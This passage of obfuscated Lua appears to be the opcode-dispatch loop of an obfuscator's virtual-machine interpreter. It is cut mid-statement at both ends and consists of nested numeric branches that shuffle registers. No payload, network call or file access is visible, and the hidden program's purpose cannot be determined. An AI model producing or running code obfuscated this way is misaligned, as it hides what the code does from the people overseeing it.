if 15>a then n=n+1;else y=f[n];end else if a<=16 then c=y[266]else if 18>a then w[c]=w[c](w[c+1])else break end end end end end a=a+1 end end;elseif 230>=z then if 228>=z then local a,c=0 while true do if(a<29 or a==29)then if(a==14 or a<14)then if a<=6 then if a<=2 then if a<=0 then c=nil else if(a<2)then w[y[266]]={};else n=n+1;end end else if(a==4 or a<4)then if 4>a then y=f[n];else w[y[266]]=y[607];end else if 6>a then n=n+1;else y=f[n];end end end else if(a<10 or a==10)then if(a<8 or a==8)then if 7<a then n=(n+1);else w[y[266]][w[y[607]]]=w[y[185]];end else if not(9~=a)then y=f[n];else w[y[266]]=y[607];end end else if(a<=12)then if(a<12)then n=(n+1);else y=f[n];end else if a<14 then w[y[266]][w[y[607]]]=w[y[185]];else n=(n+1);end end end end else if(a<=21)then if(a==17 or a<17)then if a<=15 then y=f[n];else if not(17==a)then w[y[266]]=y[607];else n=(n+1);end end else if(a==19 or a<19)then if 19~=a then y=f[n];else w[y[266]][w[y[607]]]=w[y[185]];end else if(a==20)then n=(n+1);else y=f[n];end end end else if(a<25 or a==25)then if(a<23 or a==23)then if(a==22)then w[y[266]]=y[607];else n=n+1;end else if not(25==a)then y=f[n];else w[y[266]][w[y[607]]]=w[y[185]];end end else if(a==27 or a<27)then if not(a==27)then n=(n+1);else y=f[n];end else if(29>a)then w[y[266]]=y[607];else n=(n+1);end end end end end else if a<=44 then if(a==36 or a<36)then if a<=32 then if(a<=30)then y=f[n];else if a<32 then w[y[266]][w[y[607]]]=w[y[185]];else n=(n+1);end end else if a<=34 then if not(34==a)then y=f[n];else w[y[266]]=y[607];end else if a<36 then n=(n+1);else y=f[n];end end end else if a<=40 then if(a<38 or a==38)then if not(a~=37)then w[y[266]][w[y[607]]]=w[y[185]];else n=n+1;end else if(a==39)then y=f[n];else w[y[266]]={};end end else if(a==42 or a<42)then if not(a~=41)then n=(n+1);else y=f[n];end else if(44~=a)then w[y[266]]=y[607];else n=n+1;end end end end else if a<=52 then if a<=48 then if a<=46 then if not(a==46)then y=f[n];else w[y[266]][w[y[607]]]=w[y[185]];end else if 48~=a then n=(n+1);else y=f[n];end end else if(a<=50)then if 49==a then w[y[266]]=j[y[607]];else n=(n+1);end else if not(51~=a)then y=f[n];else w[y[266]]=w[y[607]];end end end else if(a<=56)then if(a==54 or a<54)then if(54>a)then n=n+1;else y=f[n];end else if not(55~=a)then w[y[266]]=w[y[607]];else n=(n+1);end end else if a<=58 then if(57<a)then c=y[266]else y=f[n];end else if a==59 then w[c](r(w,c+1,y[607]))else break end end end end end end a=a+1 end elseif not(229~=z)then local a=y[266]local c={w[a](r(w,a+1,p))};local e=0;for m=a,y[185]do e=e+1;w[m]=c[e];end else do return end;end;elseif(z<231 or z==231)then w[y[266]]();elseif(z<233)then local a,c,e=0 while true do if a<=24 then if a<=11 then if a<=5 then if a<=2 then if a<=0 then c=nil else if a~=2 then e=nil else w[y[266]]={};end end else if a<=3 then n=n+1;else if a~=5 then y=f[n];else w[y[266]]=h[y[607]];end end end else if a<=8 then if a<=6 then n=n+1;else if a>7 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end else if a<=9 then n=n+1;else if a<11 then y=f[n];else w[y[266]]=h[y[607]];end end end end else if a<=17 then if a<=14 then if a<=12 then n=n+1;else if a~=14 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=15 then n=n+1;else if 17>a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=20 then if a<=18 then n=n+1;else if a==19 then y=f[n];else w[y[266]]={};end end else if a<=22 then if 21<a then y=f[n];else n=n+1;end else if a==23 then w[y[266]]={};else n=n+1;end end end end end else if a<=37 then if a<=30 then if a<=27 then if a<=25 then y=f[n];else if 26<a then n=n+1;else w[y[266]]=h[y[607]];end end else if a<=28 then y=f[n];else if 30>a then w[y[266]][y[607]]=w[y[185]];else n=n+1;end end end else if a<=33 then if a<=31 then y=f[n];else if 32<a then n=n+1;else w[y[266]]=h[y[607]];end end else if a<=35 then if a>34 then w[y[266]][y[607]]=w[y[185]];else y=f[n];end else if 37~=a then n=n+1;else y=f[n];end end end end else if a<=43 then if a<=40 then if a<=38 then w[y[266]][y[607]]=w[y[185]];else if a<40 then n=n+1;else y=f[n];end end else if a<=41 then w[y[266]]={r({},1,y[607])};else if a==42 then n=n+1;else y=f[n];end end end else if a<=46 then if a<=44 then w[y[266]]=w[y[607]];else if a>45 then y=f[n];else n=n+1;end end else if a<=48 then if a==47 then e=y[266];else c=w[e];end else if 50~=a then for m=e+1,y[607]do t(c,w[m])end;else break end end end end end end a=a+1 end else local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then e=nil else c=nil end else if a<=2 then m=nil else if a~=4 then w[y[266]]=h[y[607]];else n=n+1;end end end else if a<=6 then if 5==a then y=f[n];else w[y[266]]=h[y[607]];end else if a<=7 then n=n+1;else if a<9 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if a<=14 then if a<=11 then if 10==a then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 14>a then n=n+1;else y=f[n];end end end else if a<=16 then if 15<a then e={w[m](w[m+1])};else m=y[266]end else if a<=17 then c=0;else if a<19 then for q=m,y[185]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end end;elseif z<=256 then if 244>=z then if 238>=z then if 235>=z then if z>234 then w[y[266]][y[607]]=y[185];else if(y[266]<=w[y[185]])then n=n+1;else n=y[607];end;end;elseif 236>=z then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z<238 then local a;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](w[a+1])else if(y[266]<w[y[185]])then n=n+1;else n=y[607];end;end;elseif 241>=z then if z<=239 then local a;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif 241~=z then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];for a=y[266],y[607],1 do w[a]=nil;end;n=n+1;y=f[n];n=y[607];end;elseif 242>=z then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];e=y[607];c=y[185];a=k(w,g,e,c);w[y[266]]=a;elseif 243==z then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](w[a+1])else local a;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif 250>=z then if 247>=z then if 245>=z then w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];elseif 247>z then w[y[266]]=b(d[y[607]],nil,j);else local a;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a]()end;elseif 248>=z then w[y[266]]=y[607];elseif z~=250 then local a=y[266]w[a]=w[a](w[a+1])else w[y[266]]=true;end;elseif z<=253 then if 251>=z then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[266]]=w[y[607]][y[185]];else if a<2 then n=n+1;else y=f[n];end end else if a<=4 then if a>3 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if 6>a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if a<=9 then if a<=7 then n=n+1;else if 9>a then y=f[n];else w[y[266]][y[607]]=w[y[185]];end end else if a<=11 then if a~=11 then n=n+1;else y=f[n];end else if 13~=a then n=y[607];else break end end end end a=a+1 end elseif 253~=z then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end else if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;end;elseif 254>=z then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z>255 then w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;else if(w[y[266]]<=w[y[185]])then n=y[607];else n=n+1;end;end;elseif 268>=z then if 262>=z then if 259>=z then if z<=257 then if not w[y[266]]then n=n+1;else n=y[607];end;elseif 258<z then w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];else local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end end;elseif 260>=z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;elseif z>261 then w[y[266]]=w[y[607]][w[y[185]]];else local a;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif z<=265 then if 263>=z then w[y[266]]=false;n=n+1;elseif z<265 then local a=y[266];local c=w[y[607]];w[a+1]=c;w[a]=c[y[185]];else local a;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](w[a+1])end;elseif z<=266 then local a;w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z<268 then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end else w[y[266]]=w[y[607]];end;elseif 274>=z then if 271>=z then if z<=269 then w[y[266]]={r({},1,y[607])};elseif 270==z then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end else local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end end;elseif 272>=z then w[y[266]][w[y[607]]]=w[y[185]];elseif z~=274 then local a;local c;w={};for e=0,u,1 do if e<o then w[e]=s[e+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];c=y[266];a=w[y[607]];w[c+1]=a;w[c]=a[y[185]];else do return w[y[266]]end end;elseif 277>=z then if(z==275 or z<275)then local a=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then w={};else if a==1 then for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;else n=n+1;end end else if a<=4 then if a>3 then w[y[266]]=h[y[607]];else y=f[n];end else if 5==a then n=n+1;else y=f[n];end end end else if a<=10 then if a<=8 then if 7==a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 10>a then y=f[n];else w[y[266]]=h[y[607]];end end else if a<=12 then if a>11 then y=f[n];else n=n+1;end else if 14~=a then w[y[266]]={};else n=n+1;end end end end else if a<=21 then if a<=17 then if a<=15 then y=f[n];else if 17~=a then w[y[266]]={};else n=n+1;end end else if a<=19 then if 19>a then y=f[n];else w[y[266]][y[607]]=w[y[185]];end else if 20==a then n=n+1;else y=f[n];end end end else if a<=25 then if a<=23 then if a==22 then w[y[266]]=j[y[607]];else n=n+1;end else if 25>a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if a<=27 then if a<27 then n=n+1;else y=f[n];end else if 28==a then if w[y[266]]then n=n+1;else n=y[607];end;else break end end end end end a=a+1 end elseif not(z~=276)then local a,c=0 while true do if a<=14 then if a<=6 then if a<=2 then if a<=0 then c=nil else if a==1 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if a<=4 then if a<4 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if a~=6 then n=n+1;else y=f[n];end end end else if a<=10 then if a<=8 then if a==7 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if a==9 then y=f[n];else w[y[266]]=w[y[607]]*y[185];end end else if a<=12 then if a==11 then n=n+1;else y=f[n];end else if 13==a then w[y[266]]=w[y[607]]+w[y[185]];else n=n+1;end end end end else if a<=22 then if a<=18 then if a<=16 then if a>15 then w[y[266]]=j[y[607]];else y=f[n];end else if 17==a then n=n+1;else y=f[n];end end else if a<=20 then if a~=20 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 21==a then y=f[n];else w[y[266]]=w[y[607]];end end end else if a<=26 then if a<=24 then if a==23 then n=n+1;else y=f[n];end else if a>25 then n=n+1;else w[y[266]]=w[y[607]]+w[y[185]];end end else if a<=28 then if a<28 then y=f[n];else c=y[266]end else if 30>a then w[c]=w[c](r(w,c+1,y[607]))else break end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[266]]=w[y[607]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if 4<a then n=n+1;else w[y[266]]=y[607];end else if 7~=a then y=f[n];else w[y[266]]=y[607];end end end else if a<=11 then if a<=9 then if 8<a then y=f[n];else n=n+1;end else if 11>a then w[y[266]]=y[607];else n=n+1;end end else if a<=13 then if a~=13 then y=f[n];else c=y[266]end else if 14<a then break else w[c]=w[c](r(w,c+1,y[607]))end end end end a=a+1 end end;elseif 278>=z then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z>279 then local a=y[266];local c=w[a];for e=a+1,y[607]do t(c,w[e])end;else local a=y[266];local c,e,m=w[a],w[a+1],w[a+2];local c=c+m;w[a]=c;if m>0 and c<=e or m<0 and c>=e then n=y[607];w[a+3]=c;end;end;elseif z<=327 then if 303>=z then if 291>=z then if z<=285 then if z<=282 then if 282>z then do return w[y[266]]end else local a;w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=y[185];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif z<=283 then local a;local c;local e;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];e=y[607];c=y[185];a=k(w,g,e,c);w[y[266]]=a;elseif z~=285 then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if w[y[266]]then n=n+1;else n=y[607];end;else local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];e=y[607];c=y[185];a=k(w,g,e,c);w[y[266]]=a;end;elseif 288>=z then if z<=286 then local a=0 while true do if a<=7 then if a<=3 then if a<=1 then if 1>a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 2<a then w[y[266]][y[607]]=w[y[185]];else y=f[n];end end else if a<=5 then if 4==a then n=n+1;else y=f[n];end else if a==6 then w[y[266]]=h[y[607]];else n=n+1;end end end else if a<=11 then if a<=9 then if 8<a then w[y[266]]=w[y[607]][y[185]];else y=f[n];end else if a>10 then y=f[n];else n=n+1;end end else if a<=13 then if a>12 then n=n+1;else w[y[266]][y[607]]=w[y[185]];end else if a<=14 then y=f[n];else if a>15 then break else do return w[y[266]]end end end end end end a=a+1 end elseif 287==z then if(w[y[266]]<w[y[185]])then n=n+1;else n=y[607];end;else w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;end;elseif z<=289 then local a=y[266]w[a](w[a+1])elseif z==290 then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end else local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))end;elseif z<=297 then if(294>=z)then if(z==292 or z<292)then local a=w[y[185]];if not a then n=(n+1);else w[y[266]]=a;n=y[607];end;elseif(z==293)then w[y[266]]=w[y[607]]*y[185];else local a=y[266];do return w[a],w[a+1]end end;elseif z<=295 then local a,c,e,m=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if 0<a then e=nil else c=nil end else if a~=3 then m=nil else w[y[266]]=h[y[607]];end end else if a<=5 then if a~=5 then n=n+1;else y=f[n];end else if 6<a then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end end else if a<=11 then if a<=9 then if a>8 then w[y[266]]=h[y[607]];else y=f[n];end else if a==10 then n=n+1;else y=f[n];end end else if a<=13 then if a~=13 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if a~=15 then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end end end else if a<=23 then if a<=19 then if a<=17 then if 17~=a then n=n+1;else y=f[n];end else if a<19 then w[y[266]]=h[y[607]];else n=n+1;end end else if a<=21 then if a>20 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end else if a<23 then n=n+1;else y=f[n];end end end else if a<=27 then if a<=25 then if 24==a then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 27>a then y=f[n];else m=y[607];end end else if a<=29 then if a<29 then e=y[185];else c=k(w,g,m,e);end else if 30==a then w[y[266]]=c;else break end end end end end a=a+1 end elseif(z~=297)then local a,c=0 while true do if a<=8 then if a<=3 then if a<=1 then if a~=1 then c=nil else w[y[266]]=w[y[607]][y[185]];end else if 3>a then n=n+1;else y=f[n];end end else if a<=5 then if 4<a then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if a<=6 then y=f[n];else if a<8 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if a<=13 then if a<=10 then if a~=10 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if a<=11 then n=n+1;else if 12<a then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if a<=15 then if a~=15 then n=n+1;else y=f[n];end else if a<=16 then c=y[266]else if a~=18 then w[c]=w[c](w[c+1])else break end end end end end a=a+1 end else local a,c=0 while true do if a<=7 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[266]]=w[y[607]][y[185]];end else if 2==a then n=n+1;else y=f[n];end end else if a<=5 then if a<5 then w[y[266]]=w[y[607]];else n=n+1;end else if a>6 then w[y[266]]=h[y[607]];else y=f[n];end end end else if a<=11 then if a<=9 then if a~=9 then n=n+1;else y=f[n];end else if a<11 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if a<=13 then if a<13 then y=f[n];else c=y[266]end else if a>14 then break else w[c]=w[c](r(w,c+1,y[607]))end end end end a=a+1 end end;elseif z<=300 then if 298>=z then local a,c,e,m=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then c=nil else e=nil end else if a<=2 then m=nil else if 3<a then n=n+1;else w[y[266]]=j[y[607]];end end end else if a<=6 then if 6~=a then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if a<=7 then n=n+1;else if a>8 then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end end else if a<=14 then if a<=11 then if 11>a then n=n+1;else y=f[n];end else if a<=12 then w[y[266]]=w[y[607]][y[185]];else if 13<a then y=f[n];else n=n+1;end end end else if a<=16 then if a==15 then m=y[266]else e={w[m](w[m+1])};end else if a<=17 then c=0;else if 18==a then for q=m,y[185]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end elseif 300~=z then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))else local a=y[266];do return r(w,a,p)end;end;elseif 301>=z then local a;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];a=y[266]w[a]=w[a](r(w,a+1,y[607]))elseif z>302 then local a=y[266]local c={}for e=1,#v do local m=v[e]for q=1,#m do local m=m[q]local q,q=m[1],m[2]if q>=a then c[q]=w[q]m[1]=c v[e]=nil;end end end else local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a](w[a+1])end;elseif 315>=z then if 309>=z then if z<=306 then if 304>=z then local a=y[266];local c=w[a];for e=a+1,p do t(c,w[e])end;elseif 305==z then local a;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];a=y[266]w[a]=w[a]()else local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end end;elseif 307>=z then local a;local c;local e;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];e=y[266]c={w[e](w[e+1])};a=0;for m=e,y[185]do a=a+1;w[m]=c[a];end elseif 308==z then local 